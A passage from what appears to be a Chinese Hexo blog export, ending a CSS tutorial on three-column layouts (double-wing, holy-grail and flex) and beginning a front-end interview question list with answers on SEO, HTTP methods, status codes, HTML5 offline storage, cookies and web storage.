class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="三列布局"><a class="markdownIt-Anchor" href="#三列布局"></a> 三列布局</h3>
<h4 id="1-左中定宽右侧自适应-右中定宽左侧自适应"><a class="markdownIt-Anchor" href="#1-左中定宽右侧自适应-右中定宽左侧自适应"></a> 1、 左中定宽，右侧自适应、右中定宽，左侧自适应</h4>
<p>说明： 解决方法与两列布局类似</p>
<h4 id="2-两侧定宽中间自适应"><a class="markdownIt-Anchor" href="#2-两侧定宽中间自适应"></a> 2、两侧定宽，中间自适应</h4>
<ul>
<li>双飞翼布局 (假设左侧 120px，右侧 130px)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.center-wrapper</span>&#123;</span></span><br><span class="line">        float: left;</span><br><span class="line">        width: 100%;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.center</span>&#123;</span></span><br><span class="line">        margin-left: 120px; // left aside width</span><br><span class="line">        margin-right: 130px; // right aside width</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.left</span>&#123;</span></span><br><span class="line">		float: left;</span><br><span class="line">        width: 120px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">    	float: left;</span><br><span class="line">    	width: 130px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center-wrapper"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span>&gt;</span>中间列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列定宽 120px<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列定宽 130px<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：需要给父元素及子元素高度。</span><br></pre></td></tr></table></figure>
<ul>
<li>圣杯布局 (假设左侧 120px，右侧 130px)</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">        position: relative;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.center</span>&#123;</span></span><br><span class="line">        margin-left: 120px; // left aside width</span><br><span class="line">        margin-right: 130px; // right aside width</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.left</span>&#123;</span></span><br><span class="line">		position: absolute;</span><br><span class="line">		top: 0;</span><br><span class="line">        left: 0;</span><br><span class="line">        width: 120px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">    	position: absolute;</span><br><span class="line">    	top: 0;</span><br><span class="line">        right: 0;</span><br><span class="line">    	width: 130px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列定宽 120px<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span>&gt;</span>中间列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列定宽 130px<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>flex 布局</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="selector-class">.wrapper</span>&#123;</span></span><br><span class="line">		display: flex；</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.center</span>&#123;</span></span><br><span class="line">		flex-grow: 1;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">	<span class="selector-class">.left</span>&#123;</span></span><br><span class="line">        width: 120px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.right</span>&#123;</span></span><br><span class="line">    	width: 130px;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左列定宽 120px<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span>&gt;</span>中间列自适应<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右列定宽 130px<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">说明：可以看出，flex 布局确实快速简洁，但是由于浏览器兼容性问题，目前老版本的浏览器不支持 flex。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>layout</tag>
      </tags>
  </entry>
  <entry>
    <title>前端面试题整理</title>
    <url>/hexolog/post/8fe9c4e1.html</url>
    <content><![CDATA[<h2 id="目录"><a class="markdownIt-Anchor" href="#目录"></a> 目录</h2>
<h3 id="html-httpweb综合问题"><a class="markdownIt-Anchor" href="#html-httpweb综合问题"></a> $HTML， HTTP，web综合问题</h3>
<ul>
<li>1、前端需要注意哪些<code>SEO</code></li>
<li>2、<code>&lt;img&gt;</code>的<code>title</code>和<code>alt</code>有什么区别</li>
<li>3、<code>HTTP</code>的几种请求方法用途</li>
<li>4、从浏览器地址栏输入<code>url</code>到显示页面的步骤</li>
<li>5、如何进行网站性能优化</li>
<li>6、HTTP状态码及其含义</li>
<li>7、语义化的理解</li>
<li>8、介绍一下你对浏览器内核的理解</li>
<li>9、<code>html5</code>有哪些新特性、移除了那些元素？</li>
<li>10、<code>HTML5</code>的离线储存怎么使用，工作原理能不能解释一下？</li>
<li>11、浏览器是怎么对<code>HTML5</code>的离线储存资源进行管理和加载的呢</li>
<li>12、请描述一下 <code>cookies</code>，<code>sessionStorage</code> 和 <code>localStorage</code> 的区别</li>
<li>13、<code>iframe</code>有那些缺点？</li>
<li>14、<code>WEB</code>标准以及W3C标准是什么?</li>
<li>15、<code>xhtml</code>和<code>html</code>有什么区别?</li>
<li>16、<code>Doctype</code>作用? 严格模式与混杂模式如何区分？它们有何意义?</li>
<li>17、行内元素有哪些？块级元素有哪些？ 空(<code>void</code>)元素有那些？行内元素和块级元素有什么区别？</li>
<li>18、<code>HTML</code>全局属性(<code>global attribute</code>)有哪些</li>
<li>19、<code>Canvas</code>和<code>SVG</code>有什么区别？</li>
<li>20、<code>HTML5</code> 为什么只需要写 <code>&lt;!DOCTYPE HTML&gt;？</code></li>
<li>21、如何在页面上实现一个圆形的可点击区域？</li>
<li>22、网页验证码是干嘛的，是为了解决什么安全问题</li>
</ul>
<h3 id="css部分"><a class="markdownIt-Anchor" href="#css部分"></a> $CSS部分</h3>
<ul>
<li>1、<code>css sprite</code>是什么,有什么优缺点</li>
<li>2、<code>display: none;</code>与<code>visibility: hidden</code>;的区别</li>
<li>3、<code>link</code>与<code>@import</code>的区别</li>
<li>4、什么是<code>FOUC?</code>如何避免</li>
<li>5、如何创建块级格式化上下文(<code>block formatting context</code>),<code>BFC</code>有什么用</li>
<li>7、清除浮动的几种方式，各自的优缺点</li>
<li>8、为什么要初始化<code>CSS</code>样式?</li>
<li>9、<code>css3</code>有哪些新特性</li>
<li>10、<code>display</code>有哪些值？说明他们的作用</li>
<li>11、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？</li>
<li>12、<code>CSS</code>优先级算法如何计算？</li>
<li>13、对<code>BFC</code>规范的理解？</li>
<li>14、谈谈浮动和清除浮动</li>
<li>15、<code>position</code> 的值，<code>relative</code> 和 <code>absolute</code> 定位原点是</li>
<li>16、<code>display:inline-block</code> 什么时候不会显示间隙？(携程)</li>
<li>17、<code>PNG,GIF,JPG</code>的区别及如何选</li>
<li>18、行内元素<code>float:left</code>后是否变为块级元素？</li>
<li>19、在网页中的应该使用奇数还是偶数的字体？为什么呢？</li>
<li>20、<code>::before</code> 和 <code>:after</code>中双冒号和单冒号有什么区别？解释一下这<code>2</code>个伪元素的作用</li>
<li>21、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）</li>
<li>22、<code>CSS</code>合并方法</li>
<li>23、<code>CSS</code>不同选择器的权重(<code>CSS</code>层叠的规则)</li>
<li>24、列出你所知道可以改变页面布局的属性</li>
<li>25、<code>CSS</code>在性能优化方面的实践</li>
<li>26、<code>CSS3</code>动画（简单动画的实现，如旋转等）</li>
<li>27、<code>base64</code>的原理及优缺点</li>
</ul>
<h3 id="javascript"><a class="markdownIt-Anchor" href="#javascript"></a> $JavaScript</h3>
<ul>
<li>1、闭包</li>
<li>2、说说你对作用域链的理解</li>
<li>3、<code>JavaScript</code>原型，原型链 ? 有什么特点？</li>
<li>4、请解释什么是事件代理</li>
<li>5、<code>Javascript</code>如何实现继承？</li>
<li>6、谈谈<code>This</code>对象的理解</li>
<li>7、事件模型</li>
<li>8、<code>new</code>操作符具体干了什么呢?</li>
<li>9、<code>Ajax</code>原理</li>
<li>11、模块化开发怎么做？</li>
<li>12、异步加载<code>JS</code>的方式有哪些？</li>
<li>13、那些操作会造成内存泄漏？</li>
<li>14、<code>XML</code>和<code>JSON</code>的区别？</li>
<li>15、谈谈你对<code>webpack</code>的看法</li>
<li>17、常见<code>web</code>安全及防护原理</li>
<li>18、用过哪些设计模式？</li>
<li>19、为什么要有同源限制？</li>
<li>20、<code>offsetWidth/offsetHeight</code>,<code>clientWidth/clientHeight</code>与<code>scrollWidth/scrollHeight</code>的区别</li>
<li>21、<code>javascript</code>有哪些方法定义对象</li>
<li>22、常见兼容性问题？</li>
<li>22、说说你对<code>promise</code>的了解</li>
<li>23、你觉得<code>jQuery</code>源码有哪些写的好的地方</li>
<li>25、<code>Node</code>的应用场景</li>
<li>26、谈谈你对<code>AMD</code>、<code>CMD</code>的理解</li>
<li>27、那些操作会造成内存泄漏？</li>
<li>28、<code>web</code>开发中会话跟踪的方法有哪些</li>
<li>29、介绍<code>js</code>的基本数据类型</li>
<li>30、介绍<code>js</code>有哪些内置对象？</li>
<li>31、说几条写<code>JavaScript</code>的基本规范？</li>
<li>32、<code>JavaScript</code>有几种类型的值？，你能画一下他们的内存图吗？</li>
<li>33、<code>javascript</code>创建对象的几种方式？</li>
<li>34、<code>eval</code>是做什么的？</li>
<li>35、<code>null，undefined</code> 的区别？</li>
<li>36、<code>[“1”, “2”, “3”].map(parseInt)</code> 答案是多少？</li>
<li>37、<code>javascript</code> 代码中的<code>”use strict”</code>;是什么意思 ? 使用它区别是什么？</li>
<li>38、<code>JSON</code>的了解？</li>
<li>39、js延迟加载的方式有哪些？</li>
<li>40、同步和异步的区别?</li>
<li>41、渐进增强和优雅降级</li>
<li>42、<code>defer</code>和<code>async</code></li>
<li>43、说说严格模式的限制</li>
<li>44、<code>attribute</code>和<code>property</code>的区别是什么？</li>
<li>45、谈谈你对<code>ES6</code>的理解</li>
<li>46、<code>ECMAScript6</code> 怎么写<code>class</code>么，为什么会出现<code>class</code>这种东西?</li>
<li>47、什么是面向对象编程及面向过程编程，它们的异同和优缺点</li>
<li>48、从你自己的理解来看，你是如何理解面向对象编程的，它解决了什么问题，有什么作用</li>
<li>49、对web标准、可用性、可访问性的理解</li>
</ul>
<h3 id="编程题"><a class="markdownIt-Anchor" href="#编程题"></a> $编程题</h3>
<ul>
<li>1、写一个通用的事件侦听器函数</li>
<li>2、如何判断一个对象是否为数组</li>
<li>3、冒泡排序</li>
<li>4、快速排序</li>
<li>5、编写一个方法 求一个字符串的字节长度</li>
</ul>
<h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> $其他</h3>
<ul>
<li>1、谈谈你对重构的理解</li>
<li>2、什么样的前端代码是好的</li>
<li>3、对前端工程师这个职位是怎么样理解的？它的前景会怎么样？</li>
<li>4、你觉得前端工程的价值体现在哪</li>
<li>5、平时如何管理你的项目？</li>
</ul>
<h3 id="人事面"><a class="markdownIt-Anchor" href="#人事面"></a> 人事面</h3>
<ul>
<li>面试完你还有什么问题要问的吗</li>
<li>你有什么爱好?</li>
<li>你最大的优点和缺点是什么?</li>
<li>你为什么会选择这个行业，职位?</li>
<li>你觉得你适合从事这个岗位吗?</li>
<li>你有什么职业规划?</li>
<li>你对工资有什么要求?</li>
<li>如何看待前端开发？</li>
<li>未来三到五年的规划是怎样的？</li>
</ul>
<h3 id="常问"><a class="markdownIt-Anchor" href="#常问"></a> 常问</h3>
<ul>
<li>自我介绍</li>
<li>你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？</li>
<li>你认为哪个项目做得最好？</li>
<li>最近在看哪些前端方面的书？</li>
<li>平时是如何学习前端开发的？</li>
<li>你最有成就感的一件事</li>
<li>你是怎么学习前端的</li>
</ul>
<h2 id="html-httpweb综合问题-2"><a class="markdownIt-Anchor" href="#html-httpweb综合问题-2"></a> $HTML， HTTP，web综合问题</h2>
<h3 id="1-前端需要注意哪些seo"><a class="markdownIt-Anchor" href="#1-前端需要注意哪些seo"></a> 1、前端需要注意哪些SEO</h3>
<ul>
<li>合理的<code>title</code>、<code>description</code>、<code>keywords</code>：搜索对着三项的权重逐个减小，title值强调重点即可，重要关键词出现不要超过2次，而且要靠前，不同页面<code>title</code>要有所不同；<code>description</code>把页面内容高度概括，长度合适，不可过分堆砌关键词，不同页面<code>description</code>有所不同；<code>keywords</code>列举出重要关键词即可</li>
<li>语义化的<code>HTML</code>代码，符合W3C规范：语义化代码让搜索引擎容易理解网页</li>
<li>重要内容<code>HTML</code>代码放在最前：搜索引擎抓取<code>HTML</code>顺序是从上到下，有的搜索引擎对抓取长度有限制，保证重要内容一定会被抓取</li>
<li>重要内容不要用<code>js</code>输出：爬虫不会执行js获取内容</li>
<li>少用<code>iframe</code>：搜索引擎不会抓取<code>iframe</code>中的内容</li>
<li>非装饰性图片必须加<code>alt</code></li>
<li>提高网站速度：网站速度是搜索引擎排序的一个重要指标</li>
</ul>
<h3 id="2-img的title和alt有什么区别"><a class="markdownIt-Anchor" href="#2-img的title和alt有什么区别"></a> 2、<code>&lt;img&gt;</code>的<code>title</code>和<code>alt</code>有什么区别</h3>
<ul>
<li>通常当鼠标滑动到元素上的时候显示</li>
<li><code>alt</code>是<code>&lt;img&gt;</code>的特有属性，是图片内容的等价描述，用于图片无法加载时显示、读屏器阅读图片。可提图片高可访问性，除了纯装饰图片外都必须设置有意义的值，搜索引擎会重点分析。</li>
</ul>
<h3 id="3-http的几种请求方法用途"><a class="markdownIt-Anchor" href="#3-http的几种请求方法用途"></a> 3、HTTP的几种请求方法用途</h3>
<ul>
<li>
<p>1、<code>GET</code>方法</p>
<ul>
<li>发送一个请求来取得服务器上的某一资源</li>
</ul>
</li>
<li>
<p>2、<code>POST</code>方法</p>
<ul>
<li>向<code>URL</code>指定的资源提交数据或附加新的数据</li>
</ul>
</li>
<li>
<p>3、<code>PUT</code>方法</p>
<ul>
<li>跟<code>POST</code>方法很像，也是想服务器提交数据。但是，它们之间有不同。PUT指定了资源在服务器上的位置，而<code>POST</code>没有</li>
</ul>
</li>
<li>
<p>4、<code>HEAD</code>方法</p>
<ul>
<li>只请求页面的首部</li>
</ul>
</li>
<li>
<p>5、<code>DELETE</code>方法</p>
<ul>
<li>删除服务器上的某资源</li>
</ul>
</li>
<li>
<p>6、<code>OPTIONS</code>方法</p>
<ul>
<li>它用于获取当前<code>URL</code>所支持的方法。如果请求成功，会有一个<code>Allow</code>的头包含类似<code>“GET,POST”</code>这样的信息</li>
</ul>
</li>
<li>
<p>7、<code>TRACE</code>方法</p>
<ul>
<li><code>TRACE</code>方法被用于激发一个远程的，应用层的请求消息回路</li>
</ul>
</li>
<li>
<p>8、<code>CONNECT</code>方法</p>
<ul>
<li>把请求连接转换到透明的<code>TCP/IP</code>通道</li>
</ul>
</li>
</ul>
<h3 id="4-从浏览器地址栏输入url到显示页面的步骤"><a class="markdownIt-Anchor" href="#4-从浏览器地址栏输入url到显示页面的步骤"></a> 4、从浏览器地址栏输入url到显示页面的步骤</h3>
<ul>
<li>浏览器根据请求的<code>URL</code>交给<code>DNS</code>域名解析，找到真实<code>IP</code>，向服务器发起请求；</li>
<li>服务器交给后台处理完成后返回数据，浏览器接收文件（<code>HTML、JS、CSS</code>、图象等）；</li>
<li>浏览器对加载到的资源（<code>HTML、JS、CSS</code>等）进行语法解析，建立相应的内部数据结构（如<code>HTML</code>的<code>DOM</code>）；</li>
<li>载入解析到的资源文件，渲染页面，完成。</li>
</ul>
<h3 id="5-如何进行网站性能优化"><a class="markdownIt-Anchor" href="#5-如何进行网站性能优化"></a> 5、如何进行网站性能优化</h3>
<ul>
<li>
<p><code>content</code>方面</p>
<ol>
<li>减少<code>HTTP</code>请求：合并文件、<code>CSS</code>精灵、<code>inline Image</code></li>
<li>减少<code>DNS</code>查询：<code>DNS</code>缓存、将资源分布到恰当数量的主机名</li>
<li>减少<code>DOM</code>元素数量</li>
</ol>
</li>
<li>
<p><code>Server</code>方面</p>
<ol>
<li>使用<code>CDN</code></li>
<li>配置<code>ETag</code></li>
<li>对组件使用<code>Gzip</code>压缩</li>
</ol>
</li>
<li>
<p><code>Cookie</code>方面</p>
<ol>
<li>减小<code>cookie</code>大小</li>
</ol>
</li>
<li>
<p><code>css</code>方面</p>
<ol>
<li>将样式表放到页面顶部</li>
<li>不使用<code>CSS</code>表达式</li>
<li>使用<code>&lt;link&gt;</code>不使用<code>@import</code></li>
</ol>
</li>
<li>
<p><code>Javascript</code>方面</p>
<ol>
<li>将脚本放到页面底部</li>
<li>将<code>javascript</code>和<code>css</code>从外部引入</li>
<li>压缩<code>javascript</code>和<code>css</code></li>
<li>删除不需要的脚本</li>
<li>减少<code>DOM</code>访问</li>
</ol>
</li>
<li>
<p>图片方面</p>
<ol>
<li>优化图片：根据实际颜色需要选择色深、压缩</li>
<li>优化<code>css</code>精灵</li>
<li>不要在<code>HTML</code>中拉伸图片</li>
</ol>
</li>
</ul>
<h3 id="6-http状态码及其含义"><a class="markdownIt-Anchor" href="#6-http状态码及其含义"></a> 6、HTTP状态码及其含义</h3>
<ul>
<li><code>1XX</code>：信息状态码
<ul>
<li><code>100 Continue</code>   继续，一般在发送<code>post</code>请求时，已发送了<code>http header</code>之后服务端将返回此信息，表示确认，之后发送具体参数信息</li>
</ul>
</li>
<li><code>2XX</code>：成功状态码
<ul>
<li><code>200 OK</code>         正常返回信息</li>
<li><code>201 Created</code>   请求成功并且服务器创建了新的资源</li>
<li><code>202 Accepted</code>   服务器已接受请求，但尚未处理</li>
</ul>
</li>
<li><code>3XX</code>：重定向
<ul>
<li><code>301 Moved Permanently</code>  请求的网页已永久移动到新位置。</li>
<li><code>302 Found</code>     临时性重定向。</li>
<li><code>303 See Other</code>  临时性重定向，且总是使用 <code>GET</code> 请求新的 <code>URI</code>。</li>
<li><code>304 Not Modified</code> 自从上次请求后，请求的网页未修改过。</li>
</ul>
</li>
<li><code>4XX</code>：客户端错误
<ul>
<li><code>400 Bad Request</code> 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。</li>
<li><code>401 Unauthorized</code> 请求未授权。</li>
<li><code>403 Forbidden</code>  禁止访问。</li>
<li><code>404 Not Found</code>   找不到如何与 <code>URI</code> 相匹配的资源。</li>
</ul>
</li>
<li><code>5XX:</code> 服务器错误
<ul>
<li><code>500 Internal Server Error</code>  最常见的服务器端错误。</li>
<li><code>503 Service Unavailable</code> 服务器端暂时无法处理请求（可能是过载或维护）。</li>
</ul>
</li>
</ul>
<h3 id="7-语义化的理解"><a class="markdownIt-Anchor" href="#7-语义化的理解"></a> 7、语义化的理解</h3>
<ul>
<li>用正确的标签做正确的事情！</li>
<li><code>html</code>语义化就是让页面的内容结构化，便于对浏览器、搜索引擎解析；</li>
<li>在没有样式<code>CSS</code>情况下也以一种文档格式显示，并且是容易阅读的。</li>
<li>搜索引擎的爬虫依赖于标记来确定上下文和各个关键字的权重，利于 <code>SEO</code>。</li>
<li>使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解</li>
</ul>
<h3 id="8-介绍一下你对浏览器内核的理解"><a class="markdownIt-Anchor" href="#8-介绍一下你对浏览器内核的理解"></a> 8、介绍一下你对浏览器内核的理解？</h3>
<ul>
<li>
<p>主要分成两部分：渲染引擎(<code>layout engineer</code>或<code>Rendering Engine</code>)和<code>JS</code>引擎</p>
</li>
<li>
<p>渲染引擎：负责取得网页的内容（<code>HTML</code>、<code>XML</code>、图像等等）、整理讯息（例如加入<code>CSS</code>等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核</p>
</li>
<li>
<p><code>JS</code>引擎则：解析和执行<code>javascript</code>来实现网页的动态效果</p>
</li>
<li>
<p>最开始渲染引擎和<code>JS</code>引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎</p>
</li>
</ul>
<h3 id="9-html5有哪些新特性-移除了那些元素"><a class="markdownIt-Anchor" href="#9-html5有哪些新特性-移除了那些元素"></a> 9、html5有哪些新特性、移除了那些元素？</h3>
<ul>
<li>
<p><code>HTML5</code> 现在已经不是 <code>SGML</code> 的子集，主要是关于图像，位置，存储，多任务等功能的增加</p>
<ul>
<li>绘画 <code>canvas</code></li>
<li>用于媒介回放的 <code>video</code> 和 <code>audio</code> 元素</li>
<li>本地离线存储 <code>localStorage</code> 长期存储数据，浏览器关闭后数据不丢失</li>
<li><code>sessionStorage</code> 的数据在浏览器关闭后自动删除</li>
<li>语意化更好的内容元素，比如 <code>article</code>、<code>footer</code>、<code>header</code>、<code>nav</code>、<code>section</code></li>
<li>表单控件，<code>calendar</code>、<code>date</code>、<code>time</code>、<code>email</code>、<code>url</code>、<code>search</code></li>
<li>新的技术<code>webworker</code>, <code>websocket</code>, <code>Geolocation</code></li>
</ul>
</li>
<li>
<p>移除的元素：</p>
<ul>
<li>纯表现的元素：<code>basefont</code>，<code>big</code>，<code>center</code>，<code>font</code>，<code>s</code>，<code>strike</code>，<code>tt</code>，<code>u</code></li>
<li>对可用性产生负面影响的元素：<code>frame</code>，<code>frameset</code>，<code>noframes</code></li>
</ul>
</li>
<li>
<p>支持<code>HTML5</code>新标签：</p>
<ul>
<li><code>IE8/IE7/IE6</code>支持通过<code>document.createElement</code>方法产生的标签</li>
<li>可以利用这一特性让这些浏览器支<code>持HTML5</code>新标签</li>
<li>浏览器支持新标签后，还需要添加标签默认的样式</li>
</ul>
</li>
<li>
<p>当然也可以直接使用成熟的框架、比如<code>html5shim</code></p>
</li>
</ul>
<h3 id="10-html5的离线储存怎么使用工作原理能不能解释一下"><a class="markdownIt-Anchor" href="#10-html5的离线储存怎么使用工作原理能不能解释一下"></a> 10、<code>HTML5</code>的离线储存怎么使用，工作原理能不能解释一下？</h3>
<ul>
<li>
<p>在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件</p>
</li>
<li>
<p>原理：<code>HTML5</code>的离线存储是基于一个新建的<code>.appcache</code>文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像<code>cookie</code>一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示</p>
</li>
<li>
<p>如何使用：</p>
<ul>
<li>页面头部像下面一样加入一个<code>manifest</code>的属性；</li>
<li>在<code>cache.manifest</code>文件的编写离线存储的资源</li>
<li>在离线状态时，操作<code>window.applicationCache</code>进行需求实现</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">CACHE MANIFEST</span><br><span class="line">#v0.11</span><br><span class="line">CACHE:</span><br><span class="line">js/app.js</span><br><span class="line">css/style.css</span><br><span class="line">NETWORK:</span><br><span class="line">resourse/logo.png</span><br><span class="line">FALLBACK:</span><br><span class="line">/ <span class="regexp">/offline.html</span></span><br></pre></td></tr></table></figure>
<h3 id="11-浏览器是怎么对html5的离线储存资源进行管理和加载的呢"><a class="markdownIt-Anchor" href="#11-浏览器是怎么对html5的离线储存资源进行管理和加载的呢"></a> 11、浏览器是怎么对<code>HTML5</code>的离线储存资源进行管理和加载的呢</h3>
<ul>
<li>
<p>在线的情况下，浏览器发现<code>html</code>头部有<code>manifest</code>属性，它会请求<code>manifest</code>文件，如果是第一次访问<code>app</code>，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过<code>app</code>并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的<code>manifest</code>文件与旧的<code>manifes</code>t文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。</p>
</li>
<li>
<p>离线的情况下，浏览器就直接使用离线存储的资源。</p>
</li>
</ul>
<h3 id="12-请描述一下-cookiessessionstorage-和-localstorage-的区别"><a class="markdownIt-Anchor" href="#12-请描述一下-cookiessessionstorage-和-localstorage-的区别"></a> 12、请描述一下 <code>cookies</code>，<code>sessionStorage</code> 和 <code>localStorage</code> 的区别？</h3>
<ul>
<li>
<p><code>cookie</code>是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）</p>
</li>
<li>
<p>cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递</p>
</li>
<li>
<p><code>sessionStorage</code>和<code>localStorage</code>不会自动把数据发给服务器，仅在本地保存</p>
</li>
<li>
<p>存储大小：</p>
<ul>
<li><code>cookie</code>数据大小不能超过4k</li>
<li><code>sessionStorage</code>和<code>localStorage</code>虽然也有存储大小的限制，但比<code>cookie</code>大得多，可以达到5M或更大</li>
</ul>
</li>
<li>
<p>有期时间：</p>
<ul>
<li><code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据</li>
<li><code>sessionStorage</code>  数据在当前浏览器窗口关闭后自动删除</li>
<li><code>cookie</code>  设置的<code>cookie</code>过期时间之前一直有效，即使窗口或浏览器关闭</li>
</ul>
</li>
</ul>
<h3 id="13-iframe有那些缺点"><a class="markdownIt-Anchor" href="#13-iframe有那些缺点"></a> 13、iframe有那些缺点？</h3>
<ul>
<li><code>iframe</code>会阻塞主页面的<code>Onload</code>事件</li>
<li>搜索引擎的检索程序无法解读这种页面，不利于<code>SEO</code></li>
<li><code>iframe</code>和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载</li>
<li>使用<code>iframe</code>之前需要考虑这两个缺点。如果需要使用<code>iframe</code>，最好是通过<code>javascript</code>动态给<code>iframe</code>添加<code>src</code>属性值，这样可以绕开以上两个问题</li>
</ul>
<h3 id="14-web标准以及w3c标准是什么"><a class="markdownIt-Anchor" href="#14-web标准以及w3c标准是什么"></a> 14、WEB标准以及W3C标准是什么?</h3>
<ul>
<li>标签闭合、标签小写、不乱嵌套、使用外链<code>css</code>和<code>js</code>、结构行为表现的分离</li>
</ul>
<h3 id="15-xhtml和html有什么区别"><a class="markdownIt-Anchor" href="#15-xhtml和html有什么区别"></a> 15、xhtml和html有什么区别?</h3>
<ul>
<li>
<p>一个是功能上的差别</p>
<ul>
<li>主要是<code>XHTML</code>可兼容各大浏览器、手机以及<code>PDA</code>，并且浏览器也能快速正确地编译网页</li>
</ul>
</li>
<li>
<p>另外是书写习惯的差别</p>
<ul>
<li><code>XHTML</code> 元素必须被正确地嵌套，闭合，区分大小写，文档必须拥有根元素</li>
</ul>
</li>
</ul>
<h3 id="16-doctype作用-严格模式与混杂模式如何区分它们有何意义"><a class="markdownIt-Anchor" href="#16-doctype作用-严格模式与混杂模式如何区分它们有何意义"></a> 16、Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</h3>
<ul>
